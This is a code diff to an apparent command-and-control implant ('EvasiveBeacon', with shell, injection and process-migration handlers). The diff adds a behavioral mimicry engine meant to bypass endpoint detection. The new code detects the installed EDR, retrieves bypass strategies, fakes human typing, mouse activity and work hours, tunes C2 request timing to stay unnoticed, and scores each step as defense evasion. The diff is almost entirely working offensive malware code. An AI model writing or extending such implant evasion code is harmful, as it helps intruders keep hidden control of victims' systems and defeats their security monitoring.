@@ -156,6 +156,34 @@ except ImportError:
     ChainLogEntry = None
     print("[!] Report generator not available")
 
+# NEW: Import behavioral mimicry engine
+try:
+    from evasion.behavioral_mimicry import (
+        BehavioralMimicryEngine,
+        MimicryMode,
+        ActivityType,
+        TrafficPattern,
+        EDRBehavioralEngine,
+        BehavioralProfile,
+        DefenseAnalysis,
+        GANTrafficGenerator,
+        HumanMouseSimulator,
+        HumanKeyboardSimulator,
+        HumanActivityScheduler,
+        EDRDefenseAnalyzer,
+        create_mimicry_engine,
+        quick_mimic,
+        analyze_defenses,
+        get_human_timing,
+    )
+    BEHAVIORAL_MIMICRY_AVAILABLE = True
+except ImportError:
+    BEHAVIORAL_MIMICRY_AVAILABLE = False
+    BehavioralMimicryEngine = None
+    MimicryMode = None
+    DefenseAnalysis = None
+    print("[!] Behavioral mimicry not available")
+
 
 @dataclass
 class BeaconConfig:
@@ -213,6 +241,16 @@ class BeaconConfig:
     report_include_mitre: bool = True
     report_output_dir: str = "reports"
     report_theme: str = "hacker"  # dark, light, hacker
+    # NEW: Behavioral mimicry settings
+    enable_behavioral_mimicry: bool = True
+    mimicry_mode: str = "paranoid"  # disabled, light, moderate, aggressive, paranoid, human
+    mimicry_auto_detect: bool = True
+    mimicry_continuous: bool = True
+    mimicry_typing_speed: str = "average"  # slow, average, fast, expert
+    mimicry_mouse_speed: str = "average"  # slow, average, fast
+    mimicry_activity_variance: float = 0.3
+    mimicry_break_frequency: int = 45  # minutes
+    mimicry_work_hours: tuple = (9, 17)
 
 
 @dataclass
@@ -285,6 +323,11 @@ class EvasiveBeacon:
         if REPORT_GENERATOR_AVAILABLE and config.enable_reporting:
             self._init_report_generator()
         
+        # NEW: Initialize behavioral mimicry engine
+        self.mimicry_engine = None
+        if BEHAVIORAL_MIMICRY_AVAILABLE and config.enable_behavioral_mimicry:
+            self._init_behavioral_mimicry()
+        
         # Task handlers
         self.task_handlers: Dict[str, Callable] = {
             "cmd": self._handle_cmd,
@@ -298,6 +341,7 @@ class EvasiveBeacon:
             "migrate": self._handle_migrate,
             "inject": self._handle_inject,  # NEW
             "report": self._handle_report,  # NEW: Report generation handler
+            "mimicry": self._handle_mimicry,  # NEW: Behavioral mimicry handler
             "exit": self._handle_exit,
         }
         
@@ -563,6 +607,71 @@ class EvasiveBeacon:
         except Exception as e:
             print(f"[!] Failed to initialize report generator: {e}")
             self.report_generator = None
+    
+    def _init_behavioral_mimicry(self):
+        """Initialize behavioral mimicry engine for human-like EDR bypass"""
+        if not BEHAVIORAL_MIMICRY_AVAILABLE:
+            return
+        
+        try:
+            # Parse mimicry mode
+            mode_map = {
+                'disabled': MimicryMode.DISABLED,
+                'light': MimicryMode.LIGHT,
+                'moderate': MimicryMode.MODERATE,
+                'aggressive': MimicryMode.AGGRESSIVE,
+                'paranoid': MimicryMode.PARANOID,
+                'human': MimicryMode.HUMAN,
+            }
+            mimicry_mode = mode_map.get(
+                self.config.mimicry_mode.lower(),
+                MimicryMode.PARANOID
+            )
+            
+            # Create behavioral profile
+            profile = BehavioralProfile(
+                profile_id=self.config.beacon_id,
+                typing_speed=self.config.mimicry_typing_speed,
+                mouse_speed=self.config.mimicry_mouse_speed,
+                work_hours=self.config.mimicry_work_hours,
+                break_frequency=self.config.mimicry_break_frequency,
+                activity_variance=self.config.mimicry_activity_variance,
+            )
+            
+            # Create mimicry engine
+            self.mimicry_engine = BehavioralMimicryEngine(
+                mode=mimicry_mode,
+                profile=profile
+            )
+            
+            # Auto-detect EDR and adjust mode if enabled
+            defense_analysis = None
+            if self.config.mimicry_auto_detect:
+                defense_analysis = self.mimicry_engine.analyze_defenses()
+                print(f"[+] Defense analysis completed:")
+                print(f"    Detected EDR: {defense_analysis.edr_detected.value if defense_analysis.edr_detected else 'None'}")
+                print(f"    ML Detection: {defense_analysis.ml_detection}")
+                print(f"    Recommended Mode: {defense_analysis.recommended_mode.value}")
+            
+            # Start continuous mimicry if enabled
+            if self.config.mimicry_continuous:
+                self.mimicry_engine.start_continuous_mimicry()
+            
+            print(f"[+] Behavioral mimicry initialized: {self.mimicry_engine.mode.value}")
+            print(f"    Continuous: {self.config.mimicry_continuous}")
+            print(f"    Typing speed: {self.config.mimicry_typing_speed}")
+            print(f"    Mouse speed: {self.config.mimicry_mouse_speed}")
+            print(f"    Activity variance: {self.config.mimicry_activity_variance}")
+            print(f"    Break frequency: {self.config.mimicry_break_frequency} min")
+            
+            if defense_analysis:
+                print(f"    Risk factors: {len(defense_analysis.risk_factors)}")
+                for rf in defense_analysis.risk_factors[:3]:
+                    print(f"      - {rf}")
+            
+        except Exception as e:
+            print(f"[!] Failed to initialize behavioral mimicry: {e}")
+            self.mimicry_engine = None
     
     def _init_evasion(self):
         """Initialize evasion components"""
@@ -1524,8 +1633,128 @@ class EvasiveBeacon:
         
         return self._handle_report({"params": {}})
     
+    def _handle_mimicry(self, task: Dict) -> Dict:
+        """
+        Control behavioral mimicry engine.
+        
+        Task params:
+            action: start, stop, status, analyze, set_mode
+            mode: Mimicry mode to set (if action=set_mode)
+        """
+        result = {
+            "success": False,
+            "action": "",
+            "mode": "",
+            "behavioral_score": 0.0,
+            "events_generated": 0,
+            "defense_analysis": None,
+            "error": None,
+        }
+        
+        if not BEHAVIORAL_MIMICRY_AVAILABLE or not self.mimicry_engine:
+            result["error"] = "Behavioral mimicry not available"
+            return result
+        
+        try:
+            params = task.get("params", {})
+            action = params.get("action", "status")
+            
+            if action == "start":
+                self.mimicry_engine.start_continuous_mimicry()
+                result["success"] = True
+                result["action"] = "started"
+                result["mode"] = self.mimicry_engine.mode.value
+                
+            elif action == "stop":
+                self.mimicry_engine.stop_continuous_mimicry()
+                result["success"] = True
+                result["action"] = "stopped"
+                
+            elif action == "status":
+                status = self.mimicry_engine.get_status()
+                result["success"] = True
+                result["action"] = "status"
+                result["mode"] = status["mode"]
+                result["behavioral_score"] = status["behavioral_score"]
+                result["events_generated"] = status["events_generated"]
+                result["is_running"] = status["is_running"]
+                result["runtime_seconds"] = status["runtime_seconds"]
+                
+            elif action == "analyze":
+                analysis = self.mimicry_engine.analyze_defenses()
+                result["success"] = True
+                result["action"] = "analyzed"
+                result["defense_analysis"] = {
+                    "edr_detected": analysis.edr_detected.value if analysis.edr_detected else None,
+                    "behavioral_monitoring": analysis.behavioral_monitoring,
+                    "ml_detection": analysis.ml_detection,
+                    "recommended_mode": analysis.recommended_mode.value,
+                    "risk_factors": analysis.risk_factors,
+                    "bypass_strategies": analysis.bypass_strategies,
+                    "confidence": analysis.confidence,
+                }
+                result["mode"] = self.mimicry_engine.mode.value
+                
+            elif action == "set_mode":
+                new_mode = params.get("mode", "paranoid")
+                mode_map = {
+                    'disabled': MimicryMode.DISABLED,
+                    'light': MimicryMode.LIGHT,
+                    'moderate': MimicryMode.MODERATE,
+                    'aggressive': MimicryMode.AGGRESSIVE,
+                    'paranoid': MimicryMode.PARANOID,
+                    'human': MimicryMode.HUMAN,
+                }
+                if new_mode in mode_map:
+                    self.mimicry_engine.mode = mode_map[new_mode]
+                    result["success"] = True
+                    result["action"] = "mode_changed"
+                    result["mode"] = new_mode
+                else:
+                    result["error"] = f"Invalid mode: {new_mode}"
+            
+            elif action == "get_timing":
+                # Get optimal timing for next C2 request
+                min_ms, max_ms = self.mimicry_engine.get_optimal_request_timing()
+                result["success"] = True
+                result["action"] = "timing"
+                result["optimal_timing"] = {"min_ms": min_ms, "max_ms": max_ms}
+            
+            else:
+                result["error"] = f"Unknown action: {action}"
+            
+            # Always include behavioral score
+            result["behavioral_score"] = self.mimicry_engine.get_behavioral_score()
+            
+            # Log mimicry action
+            self._log_chain_entry(
+                technique="behavioral_mimicry",
+                tactic="defense_evasion",
+                success=result["success"],
+                edr_bypass=1.0 - result["behavioral_score"],  # Higher bypass = lower score
+                details={"action": action, "mode": result.get("mode", "")},
+            )
+            
+        except Exception as e:
+            result["error"] = str(e)
+        
+        return result
+    
+    def _wrap_with_mimicry(self, action: Callable, *args, **kwargs) -> Any:
+        """Wrap any action with human-like behavioral mimicry"""
+        if self.mimicry_engine and self.config.enable_behavioral_mimicry:
+            return self.mimicry_engine.wrap_action(action, *args, **kwargs)
+        return action(*args, **kwargs)
+    
     def _handle_exit(self, task: Dict) -> str:
         """Stop beacon and optionally generate report"""
+        # Stop behavioral mimicry
+        if self.mimicry_engine:
+            print("[*] Stopping behavioral mimicry...")
+            self.mimicry_engine.stop_continuous_mimicry()
+            print(f"    Final behavioral score: {self.mimicry_engine.get_behavioral_score():.3f}")
+            print(f"    Events generated: {self.mimicry_engine.events_generated}")
+        
         # Auto-generate report if enabled
         if self.config.report_auto_generate:
             print("[*] Generating final chain report...")
